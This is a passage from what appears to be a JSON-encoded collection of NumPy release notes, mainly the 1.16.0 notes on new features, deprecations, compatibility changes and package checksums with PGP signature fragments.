numpy-1.14.6-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    7ce70ef6fd9bdfafd896c617761129fafaa06e4683d0bfbf3c56a87c89e02d61  numpy-1.14.6-cp36-cp36m-manylinux1_i686.whl\n    4ab59a69a627ee73a2723b60723abfe0404947c16acef7b0880d6bbec93ba7cd  numpy-1.14.6-cp36-cp36m-manylinux1_x86_64.whl\n    33acfba9f453b0b6465c0aa5fe5cb0d32b8483850bc8cc776b4d3cc96595aa03  numpy-1.14.6-cp36-none-win32.whl\n    6d3e10394dada2cdf8ba354025ddf15a744b4e833c77347e31547c4b5c77deab  numpy-1.14.6-cp36-none-win_amd64.whl\n    d37f058ea9a2fd2a9160b0cc65bbfb302dfcea8d5fe178299938d95d7bfa2b83  numpy-1.14.6-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a1cafe27328c1f01127297f11e2be25d5d3821d2654a7459e017cfce98258995  numpy-1.14.6-cp37-cp37m-manylinux1_i686.whl\n    df2937c62d8d3059c1396c7cacfc12577c0923e2a37557592759358848b1544c  numpy-1.14.6-cp37-cp37m-manylinux1_x86_64.whl\n    d3f22c0781ad5fe51d7210f36a91f01620355520996fc332a1d0cf24e0cab794  numpy-1.14.6-cp37-none-win32.whl\n    fe909f8d14b2f16ea5d9ec2234fc0ffbfccccaef1ba6bc27d9d21acfe8cc72e1  numpy-1.14.6-cp37-none-win_amd64.whl\n    61b01b87d1e76df9a1e43fff727c1e0289c4cd2bc7be9f806e97b45aed3682cc  numpy-1.14.6.tar.gz\n    1250edf6f6c43e1d7823f0967416bc18258bb271dc536298eb0ea00a9e45b80a  numpy-1.14.6.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJbp8MFAAoJEGefIoN3xSR7oI4H/1A9ERtTOm6WRFq/EORmx9cI\n3OvlEyb2p71zWeO4r0xRKx8p07ulj15ywSi3drH+hpZJh0sxKRpgFSO27obTNPj6\ngZXFtx4O9e1Y03mHf9PEjPaO7BkJmlFvx5zyhDniXazsR6wNzKurkmK26sLI2X9S\nOkkLlq5gSqxCSdibB5HhalhS3UQ0nIxkz3WXw6P4WltYe/Ncu0xQYsJQXZ8UgG1Z\nnikY82a+Dw7Y1q39VPV6DGsYN+BylxLM0s5KGAhgwMBJegNWL3F+3pEdXBsHUDCv\nAEXxsSKr8JfPlVbUayOZeUtY2J9jf5hGK7iaSnqCPCLVlYza9J39BWHoZuEGl/8=\n=xFaC\n-----END PGP SIGNATURE-----\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.16.0": "==========================\n\nThis NumPy release is the last one to support Python 2.7 and will be maintained\nas a long term release with bug fixes until 2020.  Support for Python 3.4 been\ndropped, the supported Python versions are 2.7 and 3.5-3.7. The wheels on PyPI\nare linked with OpenBLAS v0.3.4+,  which should fix the known threading issues\nfound in previous OpenBLAS versions.\n\nDownstream developers building this release should use Cython >= 0.29 and, if\nusing OpenBLAS, OpenBLAS > v0.3.4.\n\nThis release has seen a lot of refactoring and features many bug fixes, improved\ncode organization, and better cross platform compatibility. Not all of these\nimprovements will be visible to users, but they should help make maintenance\neasier going forward.\n\n\nHighlights\n==========\n\n* Experimental support for overriding numpy functions,\n  see ``__array_function__`` below.\n\n* The ``matmul`` function is now a ufunc. This provides better\n  performance and allows overriding with ``__array_ufunc__``.\n\n* Improved support for the ARM and POWER architectures.\n\n* Improved support for AIX and PyPy.\n\n* Improved interop with ctypes.\n\n* Improved support for PEP 3118.\n\n\n\nNew functions\n=============\n\n* New functions added to the `numpy.lib.recfuntions` module to ease the\n  structured assignment changes:\n\n    * ``assign_fields_by_name``\n    * ``structured_to_unstructured``\n    * ``unstructured_to_structured``\n    * ``apply_along_fields``\n    * ``require_fields``\n\n  See the user guide at <https://docs.scipy.org/doc/numpy/user/basics.rec.html>\n  for more info.\n\n\nNew deprecations\n================\n\n* The type dictionaries `numpy.core.typeNA` and `numpy.core.sctypeNA` are\n  deprecated. They were buggy and not documented and will be removed in the\n  1.18 release. Use`numpy.sctypeDict` instead.\n\n* The `numpy.asscalar` function is deprecated. It is an alias to the more\n  powerful `numpy.ndarray.item`, not tested, and fails for scalars.\n\n* The `numpy.set_array_ops` and `numpy.get_array_ops` functions are deprecated.\n  As part of `NEP 15`, they have been deprecated along with the C-API functions\n  :c:func:`PyArray_SetNumericOps` and :c:func:`PyArray_GetNumericOps`. Users\n  who wish to override the inner loop functions in built-in ufuncs should use\n  :c:func:`PyUFunc_ReplaceLoopBySignature`.\n\n* The `numpy.unravel_index` keyword argument ``dims`` is deprecated, use\n  ``shape`` instead.\n\n* The `numpy.histogram` ``normed`` argument is deprecated.  It was deprecated\n  previously, but no warning was issued.\n\n* The ``positive`` operator (``+``) applied to non-numerical arrays is\n  deprecated. See below for details.\n\n* Passing an iterator to the stack functions is deprecated\n\n\nExpired deprecations\n====================\n\n* NaT comparisons now return ``False`` without a warning, finishing a\n  deprecation cycle begun in NumPy 1.11.\n\n* ``np.lib.function_base.unique`` was removed, finishing a deprecation cycle\n  begun in NumPy 1.4. Use `numpy.unique` instead.\n\n* multi-field indexing now returns views instead of copies, finishing a\n  deprecation cycle begun in NumPy 1.7. The change was previously attempted in\n  NumPy 1.14 but reverted until now.\n\n* ``np.PackageLoader`` and ``np.pkgload`` have been removed. These were\n  deprecated in 1.10, had no tests, and seem to no longer work in 1.15.\n\n\nFuture changes\n==============\n\n* NumPy 1.17 will drop support for Python 2.7.\n\n\nCompatibility notes\n===================\n\nf2py script on Windows\n- ----------------------\nOn Windows, the installed script for running f2py is now an ``.exe`` file\nrather than a ``*.py`` file and should be run from the command line as ``f2py``\nwhenever the ``Scripts`` directory is in the path. Running ``f2py`` as a module\n``python -m numpy.f2py [...]`` will work without path modification in any\nversion of NumPy.\n\nNaT comparisons\n- ---------------\nConsistent with the behavior of NaN, all comparisons other than inequality\nchecks with datetime64 or timedelta64 NaT (\"not-a-time\") values now always\nreturn ``False``, and inequality checks with NaT now always return ``True``.\nThis includes comparisons beteween NaT values. For compatibility with the\nold behavior, use ``np.isnat`` to explicitly check for NaT or convert\ndatetime64/timedelta64 arrays with ``.astype(np.int64)`` before making\ncomparisons.\n\ncomplex64/128 alignment has changed\n- -----------------------------------\nThe memory alignment of complex types is now the same as a C-struct composed of\ntwo floating point values, while before it was equal to the size of the type.\nFor many users (for instance on x64/unix/gcc) this means that complex64 is now\n4-byte aligned instead of 8-byte aligned. An important consequence is that\naligned structured dtypes may now have a different size. For instance,\n``np.dtype('c8,u1', align=True)`` used to have an itemsize of 16 (on x64/gcc)\nbut now it is 12.\n\nMore in detail, the complex64 type now has the same alignment as a C-struct\n``struct {float r, i;}``, according to the compiler used to compile numpy, and\nsimilarly for the complex128 and complex256 types.\n\nnd_grid __len__ removal\n- -----------------------\n``len(np.mgrid)`` and ``len(np.ogrid)`` are now considered nonsensical\nand raise a ``TypeError``.\n\n``np.unravel_index`` now accepts ``shape`` keyword argument\n- -----------------------------------------------------------\nPreviously, only the ``dims`` keyword argument was accepted\nfor specification of the shape of the array to be used\nfor unraveling. ``dims`` remains supported, but is now deprecated.\n\nmulti-field views return a view instead of a copy\n- -------------------------------------------------\nIndexing a structured array with multiple fields, e.g., ``arr[['f1', 'f3']]``,\nreturns a view into the original array instead of a copy. The returned view\nwill often have extra padding bytes corresponding to intervening fields in the\noriginal array, unlike before, which will affect code such as\n``arr[['f1', 'f3']].view('float64')``. This change has been planned since numpy\n1.7. Operations hitting this path have emitted ``FutureWarnings`` since then.\nAdditional ``FutureWarnings`` about this change were added in 1.12.\n\nTo help users update their code to account for these changes, a number of\nfunctions have been added to the ``numpy.lib.recfunctions`` module which\nsafely allow such operations. For instance, the code above can be replaced\nwith ``structured_to_unstructured(arr[['f1', 'f3']], dtype='float64')``.\nSee the \"accessing multiple fields\" section of the\n`user guide <https://docs.scipy.org/doc/numpy/user/basics.rec.html#accessing-multiple-fields>`__.\n\n\nC API changes\n=============\n\nThe :c:data:`NPY_API_VERSION` was incremented to 0x0000D, due to the addition\nof:\n\n* :c:member:`PyUFuncObject.core_dim_flags`\n* :c:member:`PyUFuncObject.core_dim_sizes`\n* :c:member:`PyUFuncObject.identity_value`\n* :c:function:`PyUFunc_FromFuncAndDataAndSignatureAndIdentity`\n\n\nNew Features\n============\n\nIntegrated squared error (ISE) estimator added to ``histogram``\n- ---------------------------------------------------------------\nThis method (``bins='stone'``) for optimizing the bin number is a\ngeneralization of the Scott's rule. The Scott's rule assumes the distribution\nis approximately Normal, while the ISE_ is a non-parametric method based on\ncross-validation.\n\n.. _ISE: https://en.wikipedia.org/wiki/Histogram#Minimizing_cross-validation_estimated_squared_error\n\n``max_rows`` keyword added for ``np.loadtxt``\n- ---------------------------------------------\nNew keyword ``max_rows`` in `numpy.loadtxt` sets the maximum rows of the\ncontent to be read after ``skiprows``, as in `numpy.genfromtxt`.\n\nmodulus operator support added for ``np.timedelta64`` operands\n- --------------------------------------------------------------\nThe modulus (remainder) operator is now supported for two operands\nof type ``np.timedelta64``. The operands may have different units\nand the return value will match the type of the operands.\n\n\nImprovements\n============\n\nno-copy pickling of numpy arrays\n- --------------------------------\nUp to protocol 4, numpy array pickling created 2 spurious copies of the data\nbeing serialized.  With pickle protocol 5, and the ``PickleBuffer`` API, a\nlarge variety of numpy arrays can now be serialized without any copy using\nout-of-band buffers, and with one less copy using in-band buffers. This\nresults, for large arrays, in an up to 66% drop in peak memory usage.\n\nbuild shell independence\n- ------------------------\nNumPy builds should no longer interact with the host machine\nshell directly. ``exec_command`` has been replaced with\n``subprocess.check_output`` where appropriate.\n\n`np.polynomial.Polynomial` classes render in LaTeX in Jupyter notebooks\n- -----------------------------------------------------------------------\nWhen used in a front-end that supports it, `Polynomial` instances are now\nrendered through LaTeX. The current format is experimental, and is subject to\nchange.\n\n``randint`` and ``choice`` now work on empty distributions\n- ----------------------------------------------------------\nEven when no elements needed to be drawn, ``np.random.randint`` and\n``np.random.choice`` raised an error when the arguments described an empty\ndistribution. This has been fixed so that e.g.\n``np.random.choice([], 0) == np.array([], dtype=float64)``.\n\n``linalg.lstsq``, ``linalg.qr``, and ``linalg.svd`` now work with empty arrays\n- ------------------------------------------------------------------------------\nPreviously, a ``LinAlgError`` would be raised when an empty matrix/empty\nmatrices (with zero rows and/or columns) is/are passed in. Now outputs of\nappropriate shapes are returned.\n\nChain exceptions to give better error messages for invalid PEP3118 format strings\n- ---------------------------------------------------------------------------------\nThis should help track down problems.\n\nEinsum optimization path updates and efficiency improvements\n- ------------------------------------------------------------\nEinsum was synchronized with the current upstream work.\n\n`numpy.angle` and `numpy.expand_dims` now work on ``ndarray`` subclasses\n- ------------------------------------------------------------------------\nIn particular, they now work for masked arrays.\n\n``NPY_NO_DEPRECATED_API`` compiler warning suppression\n- ------------------------------------------------------\nSetting ``NPY_NO_DEPRECATED_API`` to a value of 0 will suppress the current compiler\nwarnings when the deprecated numpy API is used.\n\n``np.diff`` Added kwargs prepend and append\n- -------------------------------------------\nNew kwargs ``prepend`` and ``append``, allow for values to be inserted on\neither end of the differences.  Similar to options for `ediff1d`. Now the\ninverse of `cumsum` can be obtained easily via ``prepend=0``.\n\nARM support updated\n- -------------------\nSupport for ARM CPUs has been updated to accommodate 32 and 64 bit targets,\nand also big and little endian byte ordering. AARCH32 memory alignment issues\nhave been addressed. CI testing has been expanded to include AARCH64 targets\nvia the services of shippable.com.\n\nAppending to build flags\n- ------------------------\n`numpy.distutils` has always overridden rather than appended to `LDFLAGS` and\nother similar such environment variables for compiling Fortran extensions.\nNow, if the `NPY_DISTUTILS_APPEND_FLAGS` environment variable is set to 1, the\nbehavior will be appending.  This applied to: `LDFLAGS`, `F77FLAGS`,\n`F90FLAGS`, `FREEFLAGS`, `FOPT`, `FDEBUG`, and `FFLAGS`.  See gh-11525 for more\ndetails.\n\nGeneralized ufunc signatures now allow fixed-size dimensions\n- ------------------------------------------------------------\nBy using a numerical value in the signature of a generalized ufunc, one can\nindicate that the given function requires input or output to have dimensions\nwith the given size. E.g., the signature of a function that converts a polar\nangle to a two-dimensional cartesian unit vector would be ``()->(2)``; that\nfor one that converts two spherical angles to a three-dimensional unit vector\nwould be ``(),()->(3)``; and that for the cross product of two\nthree-dimensional vectors would be ``(3),(3)->(3)``.\n\nNote that to the elementary function these dimensions are not treated any\ndifferently from variable ones indicated with a name starting with a letter;\nthe loop still is passed the corresponding size, but it can now count on that\nsize being equal to the fixed one given in the signature.\n\nGeneralized ufunc signatures now allow flexible dimensions\n- ----------------------------------------------------------\nSome functions, in particular numpy's implementation of ```` as ``matmul``,\nare very similar to generalized ufuncs in that they operate over core\ndimensions, but one could not present them as such because they were able to\ndeal with inputs in which a dimension is missing. To support this, it is now\nallowed to postfix a dimension name with a question mark to indicate that the\ndimension does not necessarily have to be present.\n\nWith this addition, the signature for ``matmul`` can be expressed as\n``(m?,n),(n,p?)->(m?,p?)``.  This indicates that if, e.g., the second operand\nhas only one dimension, for the purposes of the elementary function it will be\ntreated as if that input has core shape ``(n, 1)``, and the output has the\ncorresponding core shape of ``(m, 1)``. The actual output array, however, has\nthe flexible dimension removed, i.e., it will have shape ``(..., m)``.\nSimilarly, if both arguments have only a single dimension, the inputs will be\npresented as having shapes ``(1, n)`` and ``(n, 1)`` to the elementary\nfunction, and the output as ``(1, 1)``, while the actual output array returned\nwill have shape ``()``. In this way, the signature allows one to use a\nsingle elementary function for four related but different signatures,\n``(m,n),(n,p)->(m,p)``, ``(n),(n,p)->(p)``, ``(m,n),(n)->(m)`` and\n``(n),(n)->()``.\n\n``np.clip`` and the ``clip`` method check for memory overlap\n- ------------------------------------------------------------\nThe ``out`` argument to these functions is now always tested for memory overlap\nto avoid corrupted results when memory overlap occurs.\n\nNew value ``unscaled`` for option ``cov`` in ``np.polyfit``\n- -----------------------------------------------------------\nA further possible value has been added to the ``cov`` parameter of the\n``np.polyfit`` function. With ``cov='unscaled'`` the scaling of the covariance\nmatrix is disabled completely (similar to setting ``absolute_sigma=True`` in\n``scipy.optimize.curve_fit``). This would be useful in occasions, where the\nweights are given by 1/sigma with sigma being the (known) standard errors of\n(Gaussian distributed) data points, in which case the unscaled matrix is\nalready a correct estimate for the covariance matrix.\n\nDetailed docstrings for scalar numeric types\n- --------------------------------------------\nThe ``help`` function, when applied to numeric types such as `numpy.intc`,\n`numpy.int_`, and `numpy.longlong`, now lists all of the aliased names for that\ntype, distinguishing between platform -dependent and -independent aliases.\n\n``__module__`` attribute now points to public modules\n- -----------------------------------------------------\nThe ``__module__`` attribute on most NumPy functions has been updated to refer\nto the preferred public module from which to access a function, rather than\nthe module in which the function happens to be defined. This produces more\ninformative displays for functions in tools such as IPython, e.g., instead of\n``<function 'numpy.core.fromnumeric.sum'>`` you now see\n``<function 'numpy.sum'>``.\n\nLarge allocations marked as suitable for transparent hugepages\n- --------------------------------------------------------------\nOn systems that support transparent hugepages over the madvise system call\nnumpy now marks that large memory allocations can be backed by hugepages which\nreduces page fault overhead and can in some fault heavy cases improve\nperformance significantly. On Linux the setting for huge pages to be used,\n`/sys/kernel/mm/transparent_hugepage/enabled`, must be at least `madvise`.\nSystems which already have it set to `always` will not see much difference as\nthe kernel will automatically use huge pages where appropriate.\n\nUsers of very old Linux kernels (~3.x and older) should make sure that\n`/sys/kernel/mm/transparent_hugepage/defrag` is not set to `always` to avoid\nperformance problems due concurrency issues in the memory defragmentation.\n\nAlpine Linux (and other musl c library distros) support\n- -------------------------------------------------------\nWe now default to use `fenv.h` for floating point status error reporting.\nPreviously we had a broken default that sometimes would not report underflow,\noverflow, and invalid floating point operations. Now we can support non-glibc\ndistrubutions like Alpine Linux as long as they ship `fenv.h`.\n\nSpeedup ``np.block`` for large arrays\n- -------------------------------------\nLarge arrays (greater than ``512 * 512``) now use a blocking algorithm based on\ncopying the data directly into the appropriate slice of the resulting array.\nThis results in significant speedups for these large arrays, particularly for\narrays being blocked along more than 2 dimensions.\n\n``arr.ctypes.data_as(...)`` holds a reference to arr\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nPreviously the caller was responsible for keeping the array alive for the\nlifetime of the pointer.\n\nSpeedup ``np.take`` for read-only arrays\n- ----------------------------------------\nThe implementation of ``np.take`` no longer makes an unnecessary copy of the\nsource array when its ``writeable`` flag is set to ``False``.\n\nSupport path-like objects for more functions\n- --------------------------------------------\nThe ``np.core.records.fromfile`` function now supports ``pathlib.Path``\nand other path-like objects in addition to a file object. Furthermore, the\n``np.load`` function now also supports path-like objects when using memory\nmapping (``mmap_mode`` keyword argument).\n\nBetter behaviour of ufunc identities during reductions\n- ------------------------------------------------------\nUniversal functions have an ``.identity`` which is used when ``.reduce`` is\ncalled on an empty axis.\n\nAs of this release, the logical binary ufuncs, `logical_and`, `logical_or`,\nand `logical_xor`, now have ``identity`` s of type `bool`, where previously they\nwere of type `int`. This restores the 1.14 behavior of getting ``bool`` s when\nreducing empty object arrays with these ufuncs, while also keeping the 1.15\nbehavior of getting ``int`` s when reducing empty object arrays with arithmetic\nufuncs like ``add`` and ``multiply``.\n\nAdditionally, `logaddexp` now has an identity of ``-inf``, allowing it to be\ncalled on empty sequences, where previously it could not be.\n\nThis is possible thanks to the new\n:c:function:`PyUFunc_FromFuncAndDataAndSignatureAndIdentity`, which allows\narbitrary values to be used as identities now.\n\nImproved conversion from ctypes objects\n- ---------------------------------------\nNumpy has always supported taking a value or type from ``ctypes`` and\nconverting it into an array or dtype, but only behaved correctly for simpler\ntypes. As of this release, this caveat is lifted - now:\n\n* The ``_pack_`` attribute of ``ctypes.Structure``, used to emulate C's\n  ``__attribute__((packed))``, is respected.\n* Endianness of all ctypes objects is preserved\n* ``ctypes.Union`` is supported\n* Non-representable constructs raise exceptions, rather than producing\n  dangerously incorrect results:\n\n  * Bitfields are no longer interpreted as sub-arrays\n  * Pointers are no longer replaced with the type that they point to\n\nA new ``ndpointer.contents`` member\n- -----------------------------------\nThis matches the ``.contents`` member of normal ctypes arrays, and can be used\nto construct an ``np.array`` around the pointers contents.  This replaces\n``np.array(some_nd_pointer)``, which stopped working in 1.15.  As a side effect\nof this change, ``ndpointer`` now supports dtypes with overlapping fields and\npadding.\n\n``matmul`` is now a ``ufunc``\n- -----------------------------\n`numpy.matmul` is now a ufunc which means that both the function and the\n``__matmul__`` operator can now be overridden by ``__array_ufunc__``. Its\nimplementation has also changed. It uses the same BLAS routines as\n`numpy.dot`, ensuring its performance is similar for large matrices.\n\nStart and stop arrays for ``linspace``, ``logspace`` and ``geomspace``\n- ----------------------------------------------------------------------\nThese functions used to be limited to scalar stop and start values, but can\nnow take arrays, which will be properly broadcast and result in an output\nwhich has one axis prepended.  This can be used, e.g., to obtain linearly\ninterpolated points between sets of points.\n\nCI extended with additional services\n- ------------------------------------\nWe now use additional free CI services, thanks to the companies that provide:\n\n* Codecoverage testing via codecov.io\n* Arm testing via shippable.com\n* Additional test runs on azure pipelines\n\nThese are in addition to our continued use of travis, appveyor (for wheels) and\nLGTM\n\n\nChanges\n=======\n\nComparison ufuncs will now error rather than return NotImplemented\n- ------------------------------------------------------------------\nPreviously, comparison ufuncs such as ``np.equal`` would return\n`NotImplemented` if their arguments had structured dtypes, to help comparison\noperators such as ``__eq__`` deal with those.  This is no longer needed, as the\nrelevant logic has moved to the comparison operators proper (which thus do\ncontinue to return `NotImplemented` as needed). Hence, like all other ufuncs,\nthe comparison ufuncs will now error on structured dtypes.\n\nPositive will now raise a deprecation warning for non-numerical arrays\n- ----------------------------------------------------------------------\nPreviously, ``+array`` unconditionally returned a copy. Now, it will\nraise a ``DeprecationWarning`` if the array is not numerical (i.e.,\nif ``np.positive(array)`` raises a ``TypeError``. For ``ndarray``\nsubclasses that override the default ``__array_ufunc__`` implementation,\nthe ``TypeError`` is passed on.\n\n``NDArrayOperatorsMixin`` now implements matrix multiplication\n- --------------------------------------------------------------\nPreviously, ``np.lib.mixins.NDArrayOperatorsMixin`` did not implement the\nspecial methods for Python's matrix multiplication operator (````). This has\nchanged now that ``matmul`` is a ufunc and can be overridden using\n``__array_ufunc__``.\n\nThe scaling of the covariance matrix in ``np.polyfit`` is different\n- -------------------------------------------------------------------\nSo far, ``np.polyfit`` used a non-standard factor in the scaling of the the\ncovariance matrix. Namely, rather than using the standard ``chisq/(M-N)``, it\nscaled it with ``chisq/(M-N-2)`` where M is the number of data points and N is the\nnumber of parameters.  This scaling is inconsistent with other fitting programs\nsuch as e.g. ``scipy.optimize.curve_fit`` and was changed to ``chisq/(M-N)``.\n\n``maximum`` and ``minimum`` no longer emit warnings\n- ---------------------------------------------------\nAs part of code introduced in 1.10,  ``float32`` and ``float64`` set invalid\nfloat status when a Nan is encountered in `numpy.maximum` and `numpy.minimum`,\nwhen using SSE2 semantics. This caused a `RuntimeWarning` to sometimes be\nemitted. In 1.15 we fixed the inconsistencies which caused the warnings to\nbecome more conspicuous. Now no warnings will be emitted.\n\nUmath and multiarray c-extension modules merged into a single module\n- --------------------------------------------------------------------\nThe two modules were merged, according to `NEP 15`_. Previously `np.core.umath`\nand `np.core.multiarray` were seperate c-extension modules. They are now python\nwrappers to the single `np.core/_multiarray_math` c-extension module.\n\n.. _`NEP 15` : http://www.numpy.org/neps/nep-0015-merge-multiarray-umath.html\n\n``getfield`` validity checks extended\n- -------------------------------------\n`numpy.ndarray.getfield` now checks the dtype and offset arguments to prevent\naccessing invalid memory locations.\n\nNumPy functions now support overrides with ``__array_function__``\n- -----------------------------------------------------------------\nIt is now possible to override the implementation of almost all NumPy functions\non non-NumPy arrays by defining a ``__array_function__`` method, as described\nin `NEP 18`_. The sole exception are functions for explicitly casting to NumPy\narrays such as ``np.array``. As noted in the NEP, this feature remains\nexperimental and the details of how to implement such overrides may change in\nthe future.\n\n.. _`NEP 15` : http://www.numpy.org/neps/nep-0015-merge-multiarray-umath.html\n.. _`NEP 18` : http://www.numpy.org/neps/nep-0018-array-function-protocol.html\n\nArrays based off readonly buffers cannot be set ``writeable``\n- -------------------------------------------------------------\nWe now disallow setting the ``writeable`` flag True on arrays created\nfrom ``fromstring(readonly-buffer)``.\n\nChecksums\n=========\n\nMD5\n- ---\n\n    67d46af4e62111285f27a9c5731f16f9  numpy-1.16.0-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a1afdd521bf4480f4a5f43f39a345a80  numpy-1.16.0-cp27-cp27m-manylinux1_i686.whl\n    66d2e3fee4504c371da147a56fa9f900  numpy-1.16.0-cp27-cp27m-manylinux1_x86_64.whl\n    63648ca2ba0dae7f7f57cc8fc87f0fba  numpy-1.16.0-cp27-cp27m-win32.whl\n    9a53cf0c5e77f02ea9b5ff3587a1f8ac  numpy-1.16.0-cp27-cp27m-win_amd64.whl\n    7253e6e78dc1ae134abcf40201ca73ad  numpy-1.16.0-cp27-cp27mu-manylinux1_i686.whl\n    c47496091e10e31eeb9d9b07f3136237  numpy-1.16.0-cp27-cp27mu-manylinux1_x86_64.whl\n    048918abcf3936c947d06f1ee629757e  numpy-1.16.0-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    968ea61a147bd500b5d858b91ccf709d  numpy-1.16.0-cp35-cp35m-manylinux1_i686.whl\n    ee52de6e269576f468285b0f45fe9618  numpy-1.16.0-cp35-cp35m-manylinux1_x86_64.whl\n    608e1d02d014bda5c4081881a25f9fbc  numpy-1.16.0-cp35-cp35m-win32.whl\n    4ed0e6114562eefb75da7aadc3db4f8a  numpy-1.16.0-cp35-cp35m-win_amd64.whl\n    809ed96a113cf46e81ae50c9703e7a5c  numpy-1.16.0-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    26ceb7aa63fa82bc444e69156444fe6f  numpy-1.16.0-cp36-cp36m-manylinux1_i686.whl\n    5877c113fcd82198ad2285e3074a089c  numpy-1.16.0-cp36-cp36m-manylinux1_x86_64.whl\n    2ce0cc7d22e3f94e51315c1df4fd81bd  numpy-1.16.0-cp36-cp36m-win32.whl\n    b1e5a08c6a85c8a51f8039b3dc3dad3d  numpy-1.16.0-cp36-cp36m-win_amd64.whl\n    748fe792a69f79b0c3a926139b23bdbc  numpy-1.16.0-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d424c537c28510340f06a317608d7743  numpy-1.16.0-cp37-cp37m-manylinux1_i686.whl\n    8d87c0b1f8d7ad46b1976328d6c66cef  numpy-1.16.0-cp37-cp37m-manylinux1_x86_64.whl\n    25da2b41f81d4862bb36a07218477ea6  numpy-1.16.0-cp37-cp37m-win32.whl\n    22af7b6ff2da30fca2334886fdbf8573  numpy-1.16.0-cp37-cp37m-win_amd64.whl\n    d30393335b59081555fa29c680ab4784  numpy-1.16.0.tar.gz\n    90b5ec981eb9746785f43e9bfc003fed  numpy-1.16.0.zip\n\nSHA256\n- ------\n\n    a80ecac5664f420556a725a5646f2d1c60a7c0489d68a38b5056393e949e27ac  numpy-1.16.0-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    be43df2c563e264b38e3318574d80fc8f365df3fb745270934d2dbe54e006f41  numpy-1.16.0-cp27-cp27m-manylinux1_i686.whl\n    f00a2c21f60284e024bba351875f3501c6d5817d64997a0afe4f4355161a8889  numpy-1.16.0-cp27-cp27m-manylinux1_x86_64.whl\n    5774d49516c37fd3fc1f232e033d2b152f3323ca4c7bfefd7277e4c67f3c08b4  numpy-1.16.0-cp27-cp27m-win32.whl\n    25600e8901012180a1b7cd1ac3e27e7793586ecd432383191929ac2edf37ff5d  numpy-1.16.0-cp27-cp27m-win_amd64.whl\n    803b2af862dcad6c11231ea3cd1015d1293efd6c87088be33d713a9b23e9e419  numpy-1.16.0-cp27-cp27mu-manylinux1_i686.whl\n    24a9c287a4a1c427c2d45bf7c4fc6180c52a08fa0990d4c94e4c86a9b1e23ba5  numpy-1.16.0-cp27-cp27mu-manylinux1_x86_64.whl\n    96e49a0c82b4e3130093002f625545104037c2d25866fa2e0c90d6e54f5a1fbc  numpy-1.16.0-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a1dd8221f0e69038748f47b8bb3248d0b9ecdf13fe837440951c3d5ff72639bb  numpy-1.16.0-cp35-cp35m-manylinux1_i686.whl\n    3e90a9fce378114b6c2fc01fff7423300515c7b54b7cc71b02a22bc0bd7dfdd8  numpy-1.16.0-cp35-cp35m-manylinux1_x86_64.whl\n    0470c5dc32212a08ebc2405f32e8ceb9a5b1c8ac61a2daf9835ec0856a220495  numpy-1.16.0-cp35-cp35m-win32.whl\n    c40cb17188f6ae3c5b6efc6f0fd43a7ddd219b7807fe179e71027849a9b91afc  numpy-1.16.0-cp35-cp35m-win_amd64.whl\n    00a458d6821b1e87be873f2126d5646b901047a7480e8ae9773ecf214f0e19f3  numpy-1.16.0-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    f1232f98a6bbd6d1678249f94028bccc541bbc306aa5c4e1471a881b0e5a3409  numpy-1.16.0-cp36-cp36m-manylinux1_i686.whl\n    2d279bd99329e72c30937bdef82b6dc7779c7607c5a379bab1bf76be1f4c1422  numpy-1.16.0-cp36-cp36m-manylinux1_x86_64.whl\n    95c830b09626508f7808ce7f1344fb98068e63143e6050e5dc3063142fc60007  numpy-1.16.0-cp36-cp36m-win32.whl\n    ef4ae41add536cb825d8aa029c15ef510aead06ea5b68daea64f0b9ecbff17db  numpy-1.16.0-cp36-cp36m-win_amd64.whl\n    32af2bcf4bb7631dac19736a6e092ec9715e770dcaa1f85fcd99dec5040b2a4d  numpy-1.16.0-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    c6251e0f0ecac53ba2b99d9f0cc16fa9021914a78869c38213c436ba343641f0  numpy-1.16.0-cp37-cp37m-manylinux1_i686.whl\n    b19a47ff1bd2fca0cacdfa830c967746764c32dca6a0c0328d9c893f4bfe2f6b  numpy-1.16.0-cp37-cp37m-manylinux1_x86_64.whl\n    fea682f6ddc09517df0e6d5caad9613c6d91a42232aeb082df67e4d205de19cc  numpy-1.16.0-cp37-cp37m-win32.whl\n    64ff21aac30d40c20ba994c94a08d439b8ced3b9c704af897e9e4ba09d10e62c  numpy-1.16.0-cp37-cp37m-win_amd64.whl\n    9b98898687b5dd05c4ac7bcf7e8669a50dd2bb19591b772e045e5806c23e0ca4  numpy-1.16.0.tar.gz\n    cb189bd98b2e7ac02df389b6212846ab20661f4bafe16b5a70a6f1728c1cc7cb  numpy-1.16.0.zip\n-----BEGIN PGP 